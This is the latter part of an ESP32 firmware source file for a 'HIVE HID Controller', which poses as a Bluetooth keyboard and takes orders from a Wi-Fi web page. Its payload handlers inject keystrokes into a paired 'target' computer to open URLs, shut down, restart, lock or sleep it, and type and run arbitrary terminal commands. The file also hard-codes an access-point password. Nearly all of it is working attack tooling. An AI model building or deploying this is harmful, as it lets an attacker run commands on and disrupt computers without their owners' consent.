function executePayload(t){ const o=document.getElementById('payloadOutput');o.textContent='⏳ Executing...';o.className='key-display'; let u=''; switch(t){ case'type':u='/payload/type?text='+encodeURIComponent(document.getElementById('typeText').value)+'&delay='+(document.getElementById('typeDelay').value||40);break; case'url':u='/payload/url?url='+encodeURIComponent(document.getElementById('urlText').value);break; case'shutdown':u='/payload/shutdown';break; case'restart':u='/payload/restart';break; case'lock':u='/payload/lock';break; case'sleep':u='/payload/sleep';break; case'cmd':u='/payload/cmd?cmd='+encodeURIComponent(document.getElementById('customCmd').value);break; } if(u){ fetch(u).then(r=>r.json()).then(d=>{if(d.ok){o.textContent='✓ Payload sent!';o.className='key-display';}else{o.textContent='✗ '+(d.error||'Failed');o.className='key-display none';}setTimeout(()=>{o.textContent='Ready';o.className='key-display none';},3000);}).catch(()=>{o.textContent='✗ Connection error';o.className='key-display none';});}}
buildGrid(); updateStatus(); setInterval(updateStatus,3000);
fetch('/platform').then(r=>r.json()).then(d=>{if(d.platform){document.getElementById('platformSelect').value=d.platform;document.getElementById('targetPlatform').textContent=d.platform.charAt(0).toUpperCase()+d.platform.slice(1);}}).catch(()=>{});
</script>
</body>
</html>
)rawliteral";

    server.send(200, "text/html", html);
}

void handleStatus() {
    String json = "{";
    json += "\"connected\":" + String(keyboard.isPaired() ? "true" : "false") + ",";
    json += "\"deviceName\":\"" + String(keyboard.isPaired() ? "Hackerao KB Target" : "-") + "\",";
    json += "\"selectedKey\":" + String(selectedKey) + ",";
    json += "\"selectedMod\":" + String(selectedMod) + ",";
    json += "\"selectedLabel\":\"" + selectedLabel + "\",";
    json += "\"platform\":\"" + TARGET_PLATFORM + "\"";
    json += "}";
    server.send(200, "application/json", json);
}

void handleSelect() {
    if (server.hasArg("id")) {
        uint8_t id = (uint8_t)server.arg("id").toInt();
        uint8_t mod = server.hasArg("mod") ? (uint8_t)server.arg("mod").toInt() : 0;
        String name = server.hasArg("name") ? server.arg("name") : "";
        
        selectedKey = id;
        selectedMod = mod;
        selectedLabel = name;
        saveKeyToEEPROM(id, mod);
        
        String json = "{\"ok\":true}";
        server.send(200, "application/json", json);
    } else {
        server.send(400, "application/json", "{\"ok\":false,\"error\":\"missing id\"}");
    }
}

void handleSend() {
    if (selectedKey != 0 && keyboard.isPaired()) {
        Serial.printf("Sending key: 0x%02X, mod=%d (%s)\n", selectedKey, selectedMod, selectedLabel.c_str());
        sendHIDRaw(selectedKey, selectedMod);
        server.send(200, "application/json", "{\"ok\":true}");
    } else if (!keyboard.isPaired()) {
        server.send(200, "application/json", "{\"ok\":false,\"error\":\"No BLE device connected\"}");
    } else {
        server.send(200, "application/json", "{\"ok\":false,\"error\":\"No key selected\"}");
    }
}

void handleReset() {
    clearSavedKey();
    server.send(200, "application/json", "{\"ok\":true}");
}

// ─── Platform ───
void handlePlatform() {
    if (server.method() == HTTP_GET && server.hasArg("p")) {
        TARGET_PLATFORM = server.arg("p");
        savePlatformToEEPROM(TARGET_PLATFORM);
        Serial.printf("Platform set to: %s\n", TARGET_PLATFORM.c_str());
        server.send(200, "application/json", "{\"ok\":true}");
    } else {
        String json = "{\"platform\":\"" + TARGET_PLATFORM + "\"}";
        server.send(200, "application/json", json);
    }
}

// ─── Type Text ───
void handlePayloadType() {
    if (!keyboard.isPaired()) {
        server.send(200, "application/json", "{\"ok\":false,\"error\":\"No BLE device connected\"}");
        return;
    }
    if (!server.hasArg("text")) {
        server.send(400, "application/json", "{\"ok\":false,\"error\":\"missing text\"}");
        return;
    }
    String text = server.arg("text");
    int delayMs = server.hasArg("delay") ? server.arg("delay").toInt() : 40;
    if (delayMs < 0) delayMs = 0;
    if (delayMs > 500) delayMs = 500;
    
    Serial.printf("Typing text (%d chars, %dms delay)...\n", text.length(), delayMs);
    delay(500);
    typeSlowly(text, delayMs);
    keyboard.tap(KEY_RETURN);
    
    server.send(200, "application/json", "{\"ok\":true}");
}

// ─── Open URL ───
void handlePayloadURL() {
    if (!keyboard.isPaired()) {
        server.send(200, "application/json", "{\"ok\":false,\"error\":\"No BLE device connected\"}");
        return;
    }
    if (!server.hasArg("url")) {
        server.send(400, "application/json", "{\"ok\":false,\"error\":\"missing url\"}");
        return;
    }
    String url = server.arg("url");
    Serial.printf("Opening URL: %s\n", url.c_str());
    delay(500);
    openRunDialog();
    
    if (TARGET_PLATFORM == "macos") {
        typeSlowly("open " + url);
    } else {
        typeSlowly(url);
    }
    delay(200);
    keyboard.tap(KEY_RETURN);
    
    server.send(200, "application/json", "{\"ok\":true}");
}

// ─── Shutdown ───
void handlePayloadShutdown() {
    if (!keyboard.isPaired()) {
        server.send(200, "application/json", "{\"ok\":false,\"error\":\"No BLE device connected\"}");
        return;
    }
    Serial.println("Executing: SHUTDOWN");
    delay(500);
    openTerminal();
    
    if (TARGET_PLATFORM == "windows") {
        typeSlowly("shutdown /s /t 10");
    } else if (TARGET_PLATFORM == "macos") {
        typeSlowly("sudo shutdown -h now");
    } else {
        typeSlowly("shutdown -h now");
    }
    delay(200);
    keyboard.tap(KEY_RETURN);
    
    server.send(200, "application/json", "{\"ok\":true}");
}

// ─── Restart ───
void handlePayloadRestart() {
    if (!keyboard.isPaired()) {
        server.send(200, "application/json", "{\"ok\":false,\"error\":\"No BLE device connected\"}");
        return;
    }
    Serial.println("Executing: RESTART");
    delay(500);
    openTerminal();
    
    if (TARGET_PLATFORM == "windows") {
        typeSlowly("shutdown /r /t 10");
    } else if (TARGET_PLATFORM == "macos") {
        typeSlowly("sudo shutdown -r now");
    } else {
        typeSlowly("shutdown -r now");
    }
    delay(200);
    keyboard.tap(KEY_RETURN);
    
    server.send(200, "application/json", "{\"ok\":true}");
}

// ─── Lock ───
void handlePayloadLock() {
    if (!keyboard.isPaired()) {
        server.send(200, "application/json", "{\"ok\":false,\"error\":\"No BLE device connected\"}");
        return;
    }
    Serial.println("Executing: LOCK");
    delay(500);
    
    if (TARGET_PLATFORM == "windows") {
        keyboard.press(KEY_RGUI);
        delay(100);
        keyboard.tap(KEY_L);
        delay(100);
        keyboard.releaseAll();
    } else if (TARGET_PLATFORM == "macos") {
        keyboard.tap(KEY_Q, KEY_MOD_LGUI | KEY_MOD_LCTRL);
    } else {
        keyboard.tap(KEY_L, KEY_MOD_LCTRL | KEY_MOD_LALT);
    }
    
    server.send(200, "application/json", "{\"ok\":true}");
}

// ─── Sleep ───
void handlePayloadSleep() {
    if (!keyboard.isPaired()) {
        server.send(200, "application/json", "{\"ok\":false,\"error\":\"No BLE device connected\"}");
        return;
    }
    Serial.println("Executing: SLEEP");
    delay(500);
    
    if (TARGET_PLATFORM == "windows") {
        keyboard.press(KEY_RGUI);
        delay(100);
        keyboard.tap(KEY_X);
        delay(100);
        keyboard.releaseAll();
        delay(1000);
        keyboard.tap(KEY_U);
        delay(300);
        keyboard.tap(KEY_S);
    } else if (TARGET_PLATFORM == "macos") {
        keyboard.tap(KEY_POWER, KEY_MOD_LALT | KEY_MOD_LGUI);
    } else {
        keyboard.tap(KEY_PAUSE, KEY_MOD_LCTRL | KEY_MOD_LALT);
    }
    
    server.send(200, "application/json", "{\"ok\":true}");
}

// ─── Custom Command ───
void handlePayloadCmd() {
    if (!keyboard.isPaired()) {
        server.send(200, "application/json", "{\"ok\":false,\"error\":\"No BLE device connected\"}");
        return;
    }
    if (!server.hasArg("cmd")) {
        server.send(400, "application/json", "{\"ok\":false,\"error\":\"missing cmd\"}");
        return;
    }
    String cmd = server.arg("cmd");
    Serial.printf("Executing custom command: %s\n", cmd.c_str());
    delay(500);
    openTerminal();
    typeSlowly(cmd);
    delay(200);
    keyboard.tap(KEY_RETURN);
    
    server.send(200, "application/json", "{\"ok\":true}");
}

// ============================================================
//                     SETUP
// ============================================================
void setup() {
    Serial.begin(115200);
    delay(1000);
    
    Serial.println("\n\n=== HIVE HID CONTROLLER v2.0 ===");
    
    EEPROM.begin(EEPROM_SIZE);
    loadKeyFromEEPROM();
    loadPlatformFromEEPROM();
    
    pinMode(BOOT_BUTTON, INPUT_PULLUP);
    pinMode(LED_PIN, OUTPUT);
    digitalWrite(LED_PIN, LOW);
    
    Serial.println("Starting BLE Keyboard...");
    keyboard.begin();
    
    Serial.printf("Starting WiFi AP: %s / %s\n", AP_SSID, AP_PASS);
    WiFi.softAP(AP_SSID, AP_PASS);
    WiFi.softAPConfig(IPAddress(10, 0, 0, 1), IPAddress(10, 0, 0, 1), IPAddress(255, 255, 255, 0));
    
    if (MDNS.begin("hive")) {
        MDNS.addService("http", "tcp", 80);
        Serial.println("mDNS: http://hive.local");
    } else {
        Serial.println("mDNS failed - use IP address");
    }
    
    // Web routes
    server.on("/", handleRoot);
    server.on("/status", handleStatus);
    server.on("/select", handleSelect);
    server.on("/send", handleSend);
    server.on("/reset", handleReset);
    server.on("/platform", handlePlatform);
    server.on("/payload/type", handlePayloadType);
    server.on("/payload/url", handlePayloadURL);
    server.on("/payload/shutdown", handlePayloadShutdown);
    server.on("/payload/restart", handlePayloadRestart);
    server.on("/payload/lock", handlePayloadLock);
    server.on("/payload/sleep", handlePayloadSleep);
    server.on("/payload/cmd", handlePayloadCmd);
    server.begin();
    
    Serial.println("========================================");
    Serial.println("HIVE is ready!");
    Serial.print("SSID: "); Serial.println(AP_SSID);
    Serial.print("Pass: "); Serial.println(AP_PASS);
    Serial.print("Web:  http://"); Serial.print(DOMAIN);
    Serial.print(" or http://"); Serial.println(WiFi.softAPIP().toString().c_str());
    Serial.print("Platform: "); Serial.println(TARGET_PLATFORM);
    Serial.println("========================================\n");
    
    digitalWrite(LED_PIN, HIGH);
    delay(200);
    digitalWrite(LED_PIN, LOW);
}

// ============================================================
//                     LOOP
// ============================================================
void loop() {
    server.handleClient();
    
    static bool lastButtonState = HIGH;
    bool buttonState = digitalRead(BOOT_BUTTON);
    
    if (lastButtonState == HIGH && buttonState == LOW) {
        delay(50);
        if (digitalRead(BOOT_BUTTON) == LOW) {
            Serial.println("BOOT button pressed!");
            
            if (selectedKey != 0) {
                if (keyboard.isPaired()) {
                    Serial.printf("Sending: %s\n", selectedLabel.c_str());
                    sendHIDRaw(selectedKey, selectedMod);
                    digitalWrite(LED_PIN, HIGH);
                    delay(100);
                    digitalWrite(LED_PIN, LOW);
                } else {
                    for (int i = 0; i < 3; i++) {
                        digitalWrite(LED_PIN, HIGH);
                        delay(150);
                        digitalWrite(LED_PIN, LOW);
                        delay(150);
                    }
                }
            } else {
                if (keyboard.isPaired()) {
                    delay(500);
                    typeSlowly("To use HIVE connect to Hive (password Mowzer2013!) and go to hive.local");
                    delay(100);
                    keyboard.tap(KEY_RETURN);
                    digitalWrite(LED_PIN, HIGH);
                    delay(300);
                    digitalWrite(LED_PIN, LOW);
                }
            }
            
            while (digitalRead(BOOT_BUTTON) == LOW) delay(10);
        }
    }
    lastButtonState = buttonState;
    
    static bool lastConnected = false;
    bool connected = keyboard.isPaired();
    
    if (connected && !lastConnected) {
        Serial.println("TARGET CONNECTED!");
        digitalWrite(LED_PIN, HIGH);
        delay(2000);
        digitalWrite(LED_PIN, LOW);
    } else if (!connected && lastConnected) {
        Serial.println("TARGET DISCONNECTED");
    }
    lastConnected = connected;
    
    delay(10);
}
